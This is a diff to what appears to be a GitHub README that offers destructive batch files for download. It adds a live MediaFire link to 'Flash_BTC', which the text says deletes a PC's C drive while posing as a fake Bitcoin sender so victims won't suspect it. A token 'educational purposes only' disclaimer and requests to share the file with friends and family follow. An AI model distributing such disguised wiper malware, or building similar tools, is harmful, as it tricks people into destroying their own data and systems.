@@ -18,4 +18,18 @@ Click <a href="https://www.mediafire.com/file/hje4x35bl0yr5re/Rand.bat/file">her
 
 Flash_BTC is a batch file that delete PC Cdrive<br>
 It disguise itself as a fake BTC sender and the users won't suspect when using it<br><br>
-To download Flash_BTC, click <a href="">here</a>.
+To download Flash_BTC, click <a href="https://www.mediafire.com/file/8453yp3l113yjvg/Flash_BTC.bat/file">here</a>.
+<br><br>
+
+## Disclaimer:
+Use this for educational purposes only<br>
+I won't be responsible for any shit 😈😈 caused by the attacker
+
+## Note:
+Do not try this on your PC, and if you mistakenly opened this file on ur computer, I won't be held responsible, so be careful with it<br><br>
+
+## Support me by:
+<li>Following me on GitHub</li>
+<li>Staring this repository</li>
+<li>Folking this repository</li>
+<li>Sharing this to friends and family</li>
